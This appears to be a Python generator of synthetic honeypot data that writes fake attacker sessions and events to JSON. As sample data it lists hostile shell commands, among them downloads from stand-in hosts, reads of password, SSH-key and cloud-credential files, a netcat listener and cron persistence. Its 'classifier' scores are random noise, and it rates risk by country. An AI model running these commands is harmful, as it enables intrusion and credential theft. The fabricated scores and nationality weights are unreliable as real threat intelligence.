import json, random, numpy as np
from datetime import datetime, timedelta

random.seed(42)
np.random.seed(42)

COUNTRIES = [
    ("China", "CN", 35.86, 104.19), ("Russia", "RU", 61.52, 105.31),
    ("United States", "US", 37.09, -95.71), ("Germany", "DE", 51.16, 10.45),
    ("Netherlands", "NL", 52.13, 5.29), ("Brazil", "BR", -14.23, -51.92),
    ("India", "IN", 20.59, 78.96), ("United Kingdom", "GB", 55.37, -3.43),
    ("France", "FR", 46.22, 2.21), ("Ukraine", "UA", 48.37, 31.16),
    ("Iran", "IR", 32.42, 53.68), ("South Korea", "KR", 35.90, 127.76),
    ("Vietnam", "VN", 14.05, 108.27), ("Singapore", "SG", 1.35, 103.81),
    ("Romania", "RO", 45.94, 24.96),
]

COMMANDS = [
    "ls -la", "cat /etc/passwd", "wget http://malware.xyz/bot.sh", "uname -a",
    "id", "whoami", "ps aux", "netstat -an", "ifconfig", "cat /etc/shadow",
    "chmod +x bot.sh", "./bot.sh", "curl http://evil.com/payload", "cd /tmp",
    "history", "last", "w", "top", "free -m", "cat /proc/version",
    "find / -perm -4000", "sudo su", "passwd",
    "echo '* * * * * /tmp/cron.sh' | crontab -",
    "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "nc -lvp 4444", "nmap -sV localhost", "cat passwords.txt",
    "cat /root/.ssh/id_rsa", "cat .env", "cat backup.sql",
    "cat secret_keys.txt", "ls .aws", "cat .aws/credentials",
    "./dvrHelper", "cat /proc/cpuinfo", "enable", "/bin/busybox MIRAI",
]

USERNAMES = ["root","admin","ubuntu","pi","oracle","user","test","guest","support","deploy"]
COMMON_PASSWORDS = ["123456","password","admin","root","toor","12345","pass","test","admin123","raspberry","111111","qwerty"]
SOPHISTICATED_PASSWORDS = ["P@ssw0rd!","Sup3rS3cr3t","R00tM3N0w!","hunter2","CorrectHorseBattery","xC3511!","Str0ng&Safe"]

COMMON_LIST = ["123456","password","12345678","qwerty","123456789","12345","1234","111111",
    "dragon","1234567","baseball","iloveyou","master","sunshine","ashley","passw0rd",
    "shadow","123123","654321","superman","qazwsx","michael","football","monkey",
    "696969","abc123","mustang","access","letmein","fuckyou","admin","root","toor",
    "pass","test","guest","ubuntu","raspberry","oracle","mysql","postgres"]

COUNTRY_RISK = {
    "CN":0.95,"RU":0.90,"UA":0.80,"IR":0.85,"KP":0.95,"BR":0.60,"IN":0.55,
    "VN":0.70,"RO":0.65,"NG":0.70,"PK":0.60,"BD":0.55,"TH":0.50,"ID":0.55,
    "TR":0.60,"US":0.40,"DE":0.35,"GB":0.35,"FR":0.35,"NL":0.45,"SG":0.50,
    "KR":0.45,"JP":0.30,"AU":0.25,"CA":0.30,
}

HONEYTOKEN_FILES = ["passwords.txt","id_rsa",".aws/credentials","backup.sql","wallet.dat","config.php",".env","secret_keys.txt"]

ATTACK_PATTERNS_MAP = {
    "Mirai Botnet":       {"cmds": ["/bin/busybox MIRAI","enable","system","shell"]},
    "Medusa Brute-forcer":{"cmds": []},
    "Hajime Worm":        {"cmds": ["./dvrHelper","cat /proc/cpuinfo"]},
    "Mozi Botnet":        {"cmds": ["chmod 777","./mozi"]},
    "Manual/Targeted":    {"cmds": ["cat /etc/shadow","find / -perm -4000","nc -lvp 4444","cat passwords.txt"]},
    "Unknown Scanner":    {"cmds": []},
}

def random_ip():
    return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

def detect_pattern(cmds):
    for pattern, data in ATTACK_PATTERNS_MAP.items():
        if data["cmds"] and any(sig in " ".join(cmds) for sig in data["cmds"]):
            return pattern
    if not cmds:
        return "Unknown Scanner"
    return "Manual/Targeted"

def password_intelligence(passwords):
    if not passwords:
        return "NONE", 0.1
    common_count = sum(1 for p in passwords if p in COMMON_LIST)
    ratio = common_count / len(passwords)
    if ratio > 0.8:
        return "SCRIPT_KIDDIE", 0.2
    elif ratio > 0.5:
        return "AUTOMATED", 0.5
    else:
        return "TARGETED", 0.85

def generate_sessions(n=1811):
    sessions = []
    base_time = datetime(2026, 1, 1, 0, 0, 0)

    for i in range(n):
        country, code, lat, lon = random.choice(COUNTRIES)
        lat += random.uniform(-5, 5)
        lon += random.uniform(-5, 5)

        session_count = random.randint(1, 40)
        num_commands = random.randint(0, 25) if session_count >= 5 else random.randint(0, 5)
        cmds_used = random.sample(COMMANDS, min(num_commands, len(COMMANDS)))

        use_sophisticated = random.random() > 0.7
        passwords = random.sample(SOPHISTICATED_PASSWORDS if use_sophisticated else COMMON_PASSWORDS,
                                  min(random.randint(1,4), 4))
        usernames = random.sample(USERNAMES, min(random.randint(1,5), len(USERNAMES)))

        pw_intel, pw_risk = password_intelligence(passwords)
        pattern = detect_pattern(cmds_used)
        accessed_honeytokens = [f for f in HONEYTOKEN_FILES if any(f in c for c in cmds_used)]
        honeytoken_triggered = len(accessed_honeytokens) > 0
        geo_risk = COUNTRY_RISK.get(code, 0.4)

        base_risk = max(geo_risk*0.3, pw_risk*0.3, min(session_count/40,1.0)*0.4)
        rf_score = min(1.0, base_risk + random.uniform(-0.1, 0.2))
        if honeytoken_triggered: rf_score = min(1.0, rf_score + 0.3)
        lr_score = max(0.0, min(1.0, rf_score + random.uniform(-0.05, 0.05)))
        svm_score = max(0.0, min(1.0, rf_score + random.uniform(-0.08, 0.08)))
        final_conf = max(0.0, min(1.0, rf_score*0.4 + lr_score*0.35 + svm_score*0.25))

        if honeytoken_triggered or final_conf > 0.65: risk = "HIGH"
        elif final_conf > 0.35: risk = "MEDIUM"
        else: risk = "LOW"

        if session_count >= 15 and num_commands >= 10: classification = "APT"
        elif session_count >= 8: classification = "PERSISTENT"
        elif num_commands >= 8: classification = "EXPLOITER"
        elif any("wget" in c or "curl" in c for c in cmds_used): classification = "DROPPER"
        elif session_count <= 2 and num_commands == 0: classification = "SCANNER"
        else: classification = "BRUTEFORCE"

        ts = base_time + timedelta(days=random.randint(0,15), hours=random.randint(0,23), minutes=random.randint(0,59))
        abuse_score = int(min(100, final_conf*100 + random.randint(-10,10)))
        is_known_malicious = abuse_score > 75 and random.random() > 0.3

        sessions.append({
            "attacker_id": i+1, "ip": random_ip(), "country": country,
            "country_code": code, "lat": round(lat,4), "lon": round(lon,4),
            "session_count": session_count, "classification": classification,
            "attack_pattern": pattern, "risk_level": risk,
            "rf_score": round(rf_score,4), "lr_score": round(lr_score,4),
            "svm_score": round(svm_score,4), "final_confidence": round(final_conf,4),
            "commands_tried": cmds_used, "username_attempts": usernames,
            "password_attempts": passwords, "password_intelligence": pw_intel,
            "password_risk_score": round(pw_risk,2), "geo_risk_score": round(geo_risk,2),
            "honeytoken_triggered": honeytoken_triggered,
            "accessed_honeytokens": accessed_honeytokens,
            "abuse_score": abuse_score, "is_known_malicious": is_known_malicious,
            "first_seen": ts.isoformat(),
            "last_seen": (ts + timedelta(hours=random.randint(1,72))).isoformat(),
            "blocked": risk=="HIGH" and random.random()>0.2,
            "total_events": session_count*random.randint(3,20),
        })
    return sessions

def generate_events(sessions):
    events = []
    base_time = datetime(2026, 1, 1)
    for sess in random.choices(sessions, k=5000):
        ts = base_time + timedelta(days=random.randint(0,15), hours=random.randint(0,23),
                                   minutes=random.randint(0,59), seconds=random.randint(0,59))
        event_type = random.choice(["login_attempt","command","connection","file_download","scan","honeytoken_access"])
        events.append({
            "timestamp": ts.isoformat(), "ip": sess["ip"], "country": sess["country"],
            "event_type": event_type, "risk_level": sess["risk_level"],
            "attack_pattern": sess["attack_pattern"],
            "command": random.choice(sess["commands_tried"]) if sess["commands_tried"] and event_type=="command" else None,
        })
    events.sort(key=lambda x: x["timestamp"])
    return events

if __name__ == "__main__":
    print("Generating dataset...")
    sessions = generate_sessions(1811)
    events = generate_events(sessions)
    with open("data/attackers.json","w") as f: json.dump(sessions, f)
    with open("data/events.json","w") as f: json.dump(events, f)
    from collections import Counter
    print(f"Attackers: {len(sessions)}, Events: {len(events)}")
    print(f"Patterns: {Counter(s['attack_pattern'] for s in sessions)}")
    print(f"Honeytokens triggered: {sum(1 for s in sessions if s['honeytoken_triggered'])}")
    print(f"Known malicious: {sum(1 for s in sessions if s['is_known_malicious'])}")
    print(f"Password intel: {Counter(s['password_intelligence'] for s in sessions)}")
